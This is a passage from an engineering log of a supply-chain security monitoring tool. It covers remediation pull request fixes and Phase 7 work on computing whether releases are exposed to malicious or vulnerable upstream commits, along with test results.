| `make test-integration` | 451 passed against PostgreSQL, `test_remediation.py`, `test_remediation_prs.py` and `test_postgres_migration_adds_remediation_prs` included |
| `make test-ui` | 135 passed in 19 files |
| `make test-runtime` | 203 passed, 1 skipped (as in Phase 5) |
| `make test-journey` | passed (all 10 PASS lines, including "Remediation PR Approval refuses a wrong password, then opens exactly one draft pull request on the Own repository", JOURNEY PASSED); the `asset-monitor-test` stack was then stopped with its volumes kept |
| `vitest run --maxWorkers=2 src/pages/Findings.integration.test.tsx src/pages/Jobs.integration.test.tsx` (frontend-tests), before T5's UI | 7 failed (the four new `Findings` tests, the three new `Jobs` cases), 36 passed; after it, 44 passed (with the `patch_drafting` hint case, added after that run) |
| `pytest tests/test_remediation_prs.py tests/test_artifacts.py` (backend-tests), after the retry fix | 79 passed |

Review fixes, made after the table of runs above and verified by the one below (tests in `tests/test_remediation_prs.py` unless named):
- **A cancelled job no longer strands its draft.** Cancelling a queued `patch_drafting`, `remediation_draft` or `remediation_pr` job, or `queue.recover` finalizing a `cancelling` one, set only the Job: the record stayed `drafting` or `approved`, so it could not be approved or drafted again without a database edit. The worker's failure update is now `domain.remediation_job_ended`, called by the worker, the cancel route's queued branch and `recover`. `test_a_cancelled_remediation_pr_job_is_approved_again` (a queued cancel, then a cancelling attempt recovered after its branch was created, then one Approval that reuses the branch: one pull request).
- **The merge check reads open pull requests on every check.** It read them only on a poll with new default-branch commits, so a merge commit imported by a poll whose read failed was never seen again in a quiet repository. Open records are now read on every check, the 304 path included. `test_a_merge_whose_read_failed_remediates_on_a_later_quiet_poll`; `conftest.FakeGitHub` now sends an ETag and answers 304.
- **The pull request targets the branch the diff was drafted on.** The diff and the merge check follow the repository's `source_ref`, but the pull request always targeted the default branch. It now targets `source_ref`, else the default branch. `test_the_pull_request_targets_the_branch_the_diff_was_drafted_on[release-release]`, `[None-main]`.
- **A file GitHub holds differently from the snapshot is never pushed.** A tarball applies `.gitattributes`, so a pushed whole file could differ from the base blob outside the approved diff, and a new file at an `export-ignore` path could overwrite one. Before any write, each touched path's git blob id from the snapshot must equal the base tree's entry, and a created path must be absent; otherwise `diff_rejected`. `test_a_file_github_holds_differently_from_the_snapshot_is_never_pushed` (CRLF on GitHub, LF in the tarball: no write). `FakeGitHub` and the journey's fixture server now list git blob ids.
- **A partial revert fails.** A commit path that neither snapshot holds (binary media, a symlink) is `revert_incomplete` instead of a revert that leaves it; with a `source_path`, the summary says changes outside it are not reverted. `test_a_revert_that_cannot_restore_every_changed_file_fails_its_draft`.
- **The Verdict picks the drafts.** `remediation_actions` gave every Own commit Finding a patch and a revert, so a Vulnerability fix could be reverted. Now: a Malicious change gets a revert, a Vulnerability introduced or a commit with no Verdict yet (an Operator-opened Finding, as in the journey) gets a patch or a revert, any other Verdict none. `test_an_own_vulnerability_fix_gets_no_remediation_pr`.
- **Hidden characters are visible on the Approval screen.** Bidirectional controls and zero-width characters in a diff are shown as `⟨U+XXXX⟩` under a "Hidden characters" warning, so the text approved reads as the bytes pushed; the hash is unchanged. UI `Findings` "shows a diff's bidi and zero-width characters as visible escapes".
- **A waiting draft fails when its Own repository changes.** `draft_remediation` re-pointed a `waiting_for_cap` patch at a replaced Own repository, and with the link only removed the record waited for good. A commit's patch or revert is now drafted only while its commit is of the Own repository; a waiting record otherwise becomes `draft_failed` with `not_own_repository`. `test_a_waiting_patch_draft_fails_when_the_own_repository_is_replaced`.
- **Only a fine-grained write token is accepted.** A `github_write` key without the `github_pat_` prefix (a classic token, whose `repo` scope reaches every repository) is refused with 422; the journey's fixture token now has the prefix. `tests/test_accounts.py::test_the_github_write_token_is_write_only_and_never_polls`.
- **Dead code and docs.** The revert's non-GitHub (SVN revision) branch is deleted: an Own repository is always on GitHub. README step 1 and the `write_client` docstring now say the write token is also used for the merge check's read and the connection check.

## Phase 7: Exposure and Upstream Playbooks (2026-11-14)

Phase 7 (A05 and AC-A05; the Own and Upstream columns of A06 and AC-A06; the A11 Deployed version check; AC-A12's not-exposed case; A15's Upstream Proof and Disclosure report bullets; A07's Upstream vulnerable app). This section records each task as it lands.

What each task changed:
- **T1, tag containment and persisted Exposure for Upstream Verdicts.**
  - `Sources.github_mirror(repository)` (context manager) makes a blobless bare clone (`git clone --bare --filter=blob:none --quiet`) of `{git}/{owner}/{repo}.git` in a temporary directory and yields `run(*args, stdin=None)`, git's stdout in it. `{git}` is `https://github.com`, or `NUMEN_GITHUB_GIT_URL` in test mode. git runs through `remediation.git`, which gained `env` (merged into its configuration-free, hook-free environment) and `timeout` (300 s here); nothing is checked out. `GIT_ALLOW_PROTOCOL` is `https` (the base URL's scheme in test mode). The read token is passed only as `GIT_CONFIG_COUNT/KEY_0/VALUE_0` = `http.{git}/.extraheader: Authorization: Basic base64(x-access-token:TOKEN)`, never in argv, and is required only for an https base. A failed clone raises `mirror_unavailable` (502). `Sources.svn_tags(repository)` reads `svn log -v --xml {root}/tags`: a `/tags/<name>` added with `copyfrom-rev` counts at that revision, one added without a copy at the revision that added it, and a deleted one is dropped. `Sources.svn_root` is the plugin root that `svn_url`, `release_corpus` and `svn_tags` now share.
  - New module `backend/numen/exposure.py`, pure helpers over `run` or the SVN tags: `tag_forms`, `locked_tag` (the first existing of `v{version}`, `{version}`, `{package}@{version}`), `tag_version`, `watched` (the default branch or `source_ref`, and each `watched_branches` key), `equivalents` (`git patch-id --stable` of the commit against `git log -p --no-merges` of the newest 1,000 commits of the watched branches it does not reach: its backports), `contains` (`git rev-list --max-count=1 sha ^tag` is empty for one of the commit and its backports), `decide`, `releases`, `latest_without`, `first_with` (by tag `creatordate`, only tags that name a version), `containing` (the commit and each backport, then `git rev-list --reverse --ancestry-path` across the watched branches, at most 100), `svn_releases` and `svn_target`. Semantic-version order is never used.
  - Table `exposures` (model `Exposure`, migration `c2b3d4e5f6a7`, which only creates it): `application_id`, `repository_id`, `commit_id`, `verdict`, `state` (`exposed`, `not_exposed`, `unknown`), `data` `{reason, locked_version, tag, target, analysis_id}`, `updated_at`, unique on (`application_id`, `commit_id`). `domain.record_exposure` upserts it and `domain.commit_exposures` batches it for the commit list; `commit_json` gains `exposures`, which `commit_inputs` keeps out of the agent's `commit.json`.
  - `Workflows.exposures(db, repository, commit, verdict, run_or_tags, shas=None)` gives `{application_id: found}` for each in-use Upstream link, with the package from `packages[0]` (or the plugin slug) and the target computed even with no Locked version. `commit_analysis`, before its fence and only for an opening Verdict on a repository with an in-use Upstream link (or any Malicious change), opens the mirror once (or reads the SVN tags); any `DomainError` makes every Exposure unknown with that reason. After the fence it records each Exposure, and `domain.affected_applications(db, repository, exposures)` keeps Own links and the Upstream links whose Exposure is not `not_exposed`, so a not-exposed Application gets no link, Finding, Proof, Remediation PR, Alert or `detection_rule` job.
  - The Malicious change cleanup report takes its commits from `exposure.containing` mapped to stored Commit ids (null when not stored; a Backfill commit reaches the Baseline through its descendants) and its releases from `exposure.releases` (`svn_releases` for WordPress; null when the tags cannot be read). `detection.containing_commits` and `CONTAINING_COMMITS` are deleted; `github_tags` stays for `vulnerable_tag`. The Finding page's empty release list reads "No release tag contains it".
  - Tests: `conftest.local_sources` (autouse) points `NUMEN_GITHUB_GIT_URL` at `tmp_path/git` and `NUMEN_WORDPRESS_SVN_URL` at a missing local path, so no test can clone from github.com or read plugins.svn.wordpress.org; `conftest.git_repository(base, "owner/repo")` builds a working repository there with `commit`, `tag` (annotated), `branch` and `cherry_pick`, each git call one fixed minute after the last. New `tests/test_exposure.py`; `test_detection_rules.py`'s cleanup-report test and `seeded()` now use local repositories instead of a `github_tags` monkeypatch; `test_postgres.py` replaces the JSON-path cleanup-report test with Postgres runs of the not-exposed scenario and the cleanup-report scenario.
  - Deviations: `contains` uses `git rev-list --max-count=1 sha ^ref` (empty when ref reaches sha) rather than `merge-base`, whose exit status 1 for unrelated histories would need exit-code parsing; the result is the same. `containing` takes the commit and its backports, so a backport and its descendants are listed too. A Vulnerability fix that no release contains yet is exposed at every Locked version, also with no Locked version or no matching tag (A05's "every version is exposed"), rather than unknown. `exposure_json` also carries the Exposure's `verdict`. The autouse fixture also sets `NUMEN_WORDPRESS_SVN_URL`, because `svn_tags` would otherwise reach plugins.svn.wordpress.org from tests with a WordPress Upstream Verdict.
  - Limits (marked `ponytail:`): a fresh blobless clone per job, with no disk bound; backports older than the newest 1,000 commits of the watched branches are missed (that release reads exposed). The UI does not show Exposure yet (T3); the API does.
  - Runs after T1 on Docker Desktop (Engine 20.10, 8 GB), with no request to github.com, a registry or any other outside host: `make check` passed; `make test-integration` 472 passed against PostgreSQL (`test_exposure.py`, the rewritten `test_detection_rules.py` and the three new `test_postgres.py` runs included); runner 138 passed, 66 skipped (the Engine tests); UI 136 passed in 19 files.
- **T2, recomputing Exposure on Locked version changes, with a shared Playbook runner.**
  - `Workflows.commit_analysis` is split without changing its behaviour. `read_tags(db, repository, read)` calls `read` with the mirror's `run` (or the SVN tags) and, when the tags cannot be read or a read fails part way, again with the `DomainError`. `backports(run, repository, commit)` is the commit and its patch-id equivalents. `verdict_inputs(db, repository, commit, result, outputs, source_files, run, shas=None)` is the I/O before the fence: `vulnerable_ref` (or `revision_error` and the result's `bundle_error`), and for a Malicious change its checked indicators, static files and the cleanup report's containing commits and releases. `run_playbook(db, job, target, repository, commit, analysis, result, outputs, prepared, fresh_only=False)` is the per-Application body after the fence: `link_change`, `open_finding`, the drafted bundle or static Proof, and the Own patch or revert draft. With `fresh_only`, a Finding the Application already has is left alone. `Workflows.exposures` gained `links=None` to compute one link's Exposure.
  - New job kind `exposure_check` (input `domain.repository_input(repository)`, on the Application; in `worker.LONG_KINDS` and `domain.APPLICATION_SUBJECTS`, so the Jobs page names the repository and links to the Repositories tab). For the Application's in-use Upstream link, it takes the latest commit_analysis Analysis of each commit of the current generation whose Verdict opens a Finding. With none, it returns without cloning. Otherwise it opens one mirror (or reads the SVN tags) and computes the Exposure. It runs `verdict_inputs` only for commits that are `exposed` or `unknown` and have no Finding of this Application, from the Analysis's published outputs (`artifacts.resource_files(..., "analysis", id)` without `manifest.json`) and its result. After its fence it records every Exposure, then runs `run_playbook(fresh_only=True)` for those: the Finding, its one Alert, the drafted bundle, or the static Proof with its `detection_rule` job and the cleanup report. A change to `not_exposed` leaves Findings as they are. It records nothing when the link went out of use or was re-locked while it ran, and skips a commit whose Verdict changed.
  - `domain.queue_exposure(db, application, repository)` queues it unless one is queued for the same (Application, repository). It queues only for an in-use Upstream link, and only when the repository has a commit of its current generation with an opening Verdict, because before that there is nothing to recompute. Triggers: `derive_upstreams` (a link it adds or restores, or whose Locked version it changes; it compares each link's Locked version and removal from before), `POST /applications/{id}/repositories` (an Upstream link, new or restored), `PATCH /applications/{id}/repositories/{repository_id}` (when `locked_version` is sent and differs), and `commit_analysis` after its fence (a link whose Locked version, re-read, differs from the one its Exposure used). Turning a link on and a 304 source check queue nothing (AC-A02).
  - Tests in `tests/test_exposure.py`: `test_bumping_a_locked_version_into_a_release_with_a_known_malicious_change_opens_a_finding` (AC-A05: v1.0.0 opens nothing; PATCH 1.1.0 queues the check, which opens the Finding with cause verdict Malicious change, one Alert, the pending static Proof with its queued `detection_rule` job and cleanup report releases `["v1.1.0"]`), `test_a_lockfile_rederivation_recomputes_exposure` (`github_file` and `npm_repository` monkeypatched; a lockfile bump re-locks the derived link and opens the Vulnerability introduced Finding; an unchanged lock queues nothing), `test_recomputing_exposure_runs_the_playbook_only_when_it_becomes_exposed` (not exposed to not exposed opens nothing; exposed opens it with its bundle; exposed to not exposed leaves the Finding byte-for-byte; exposed again re-publishes and alerts nothing; an unchanged PATCH and turning a link on queue nothing) and `test_a_locked_version_changed_during_analysis_is_checked_again` (a PATCH made after the Analysis computed its Exposure queues nothing, because no Verdict is stored yet; the Analysis queues the check after its fence, and the check opens the Finding).
  - Deviations: `verdict_inputs` also takes `shas`, so the patch-id scan runs once per commit. `queue_exposure` also checks that the link is in use and that the repository has an opening Verdict: without that, every Upstream link a test or Operator adds would queue a job that does nothing. In commit_analysis, `commit_finding_ref` now runs inside the open mirror, and again if the tag read fails part way. Its result is the same, and it handles its own errors.
  - Runs after T2 on Docker Desktop (Engine 20.10, 8 GB), with no request to github.com, a registry or any other outside host: the focused run (`test_exposure`, `test_findings`, `test_analysis`, `test_detection_rules`, `test_remediation_prs`, `test_alerts`, `test_intake`, `test_dependencies`) 197 passed; `make check` passed; `make test-integration` 476 passed against PostgreSQL. Runner and UI are unchanged by T2 and were not re-run.
- **T3, the Upstream Playbook cells: pin and bump Remediation PRs, the Disclosure report and step states.**
  - `domain.PLAYBOOKS` is the Own and Upstream columns of the A06 matrix by (role, Verdict). `domain.finding_cell` gives a Finding's cell: the role of its repository in its Application (`finding_role`: the source commit's repository, or a `cve` Finding's source repository) and its Verdict (`finding_verdict`: Malicious change when `malicious_change`, else the opening cause's, else the source commit's). `malicious_change` is now `finding_verdict(...) == "Malicious change"`, with the same result as before. A Finding the Operator opened on no Verdict, or a `cve` one, has no cell and keeps every step.
  - `domain.playbook_steps` gives `finding_json.playbook`, and `finding_json` also gains `exposure` and `disclosure_report` (`{text, form_url}`). `disclosure_report` is read only there, from the current revision's `disclosure-report.md`, at most 64 KiB, decoded with replacement characters.
  - `domain.require_lab` replaces the two copies of the Malicious change refusal in the Lab route and `lab_run`. It also refuses, with 409 `lab_not_allowed`, a cell with no `proof` step: the Own Vulnerability fix.
  - `domain.upstream_dependency` gives `{ecosystem, names, version}`. `remediation_actions` adds `[pin]` or `[bump]` for an Upstream cell whose Exposure has a target and whose link names packages. `POST /findings/{id}/remediation-prs` accepts `pin` and `bump` and passes that dependency, with new refusal messages.
  - `workflows.remediation_step` drafts the Upstream pin or bump (automatic, not capped, `remediation_draft`). `run_playbook` calls it for an Upstream link, with the link's Exposure row as a new `exposure` argument. `exposure_check` calls it for an open or confirmed Finding whose target was unknown before and is known now. A non-304 `source_check` queues an `exposure_check` for each Application waiting on a Vulnerability fix release (marked ponytail: a tag added without a new commit waits for the next such check).
  - `remediation_draft` pins or bumps every name in `dependency.names` (a Phase 6 record's single `name` still works).
  - `commit_analysis` facts gain `upstream`. The `commit_analysis` template asks for `disclosure-report.md` when that fact is true and the Verdict is Vulnerability introduced.
  - UI:
    - Findings page: a Playbook panel, a Disclosure report panel (escaped `<pre>`, copy button, link to the reporting form, "Asset Monitor never sends it"), and Exposure state, reason and Locked version in "Remote target exposure". The Remediation PRs empty state follows the `remediation_pr` step. The Lab panel and badge show only for a cell with a Proof step.
    - Commit page: an Exposure row with each Application's state and reason.
  - Tests:
    - New `tests/test_playbooks.py`, with fixture repositories built by `git_repository` and the npm registry replaced by a stub of `Sources.npm_version`:
      - `test_each_verdict_runs_only_the_steps_in_its_cell` covers six cells. For each it asserts the step names, the drafted RemediationPR actions (patch, revert, none, pin, pin, bump), the Lab answer (202, or 409 `lab_not_allowed` for both Malicious changes and the Own Vulnerability fix), the Disclosure report (shown only for Upstream Vulnerability introduced, although every non-Malicious bundle drafted one), and the exact set of jobs queued, with one Alert.
      - `test_a_step_that_needs_approval_waits_visibly_without_blocking_the_others`: the Proof reads `waiting_for_approval` while the pin drafts to `ready` and the Disclosure report shows. No `lab_run` or `remediation_pr` job runs, and approving the Lab leaves the pin waiting.
      - `test_without_an_own_repository_upstream_remediation_steps_are_skipped`: `no_own_repository`, no draft job, and a manual pin is refused.
      - `test_an_upstream_malicious_change_pins_the_latest_release_without_it`: v1.0.2 on the watched 1.0.x branch carries a cherry-picked payload, so the pin goes to v1.0.1, not to the semantically highest v1.0.2.
      - `test_the_react2shell_fix_bumps_to_the_first_release_that_contains_it`: the step first reads `waiting_for_release`. After a 19.x backport is tagged v19.0.1, a non-304 source check queues `exposure_check`. The bump drafts react-dom and react-server-dom-webpack to 19.0.1, with the package.json and package-lock.json diff ready, and a second Application locked at 19.0.1 is `not_exposed`.
      - `test_an_upstream_vulnerability_introduced_shows_its_disclosure_report_and_never_sends_it`: the report's text appears in no Notification, JobEvent, or Job input or result. FakeGitHub receives no request, no agent runs after the Analysis, and the 64 KiB cap holds.
    - Changed tests:
      - `test_remediation_prs.py::test_without_an_own_repository_remediation_prs_are_skipped` now covers the Upstream pin with unreadable tags: `no_safe_release`, nothing drafted, and the new message.
      - `test_exposure.py::test_recomputing_exposure_runs_the_playbook_only_when_it_becomes_exposed` compares the Finding without its now-visible `exposure`.

      - `CommitReview.integration.test.tsx`: a "Not exposed" Exposure with its reason.
  - Deviations:
    - An Operator upload can also replace `disclosure-report.md`; the panel shows whatever the current revision holds. The report is a bundle file, so the bundle download still carries it until T4 refuses Upstream downloads. `lab_run` leaves it out of the Lab's inputs.
    - `remediation_step` also requires the Finding's cell to be the Upstream cell of the Exposure's Verdict, so a Finding that a later Verdict made a Malicious change is never bumped.
    - `playbook_steps` reads `no_own_repository` before an existing draft's status.
    - The Deployed version check step reads `unknown` until T4.

    - `make check` passed.
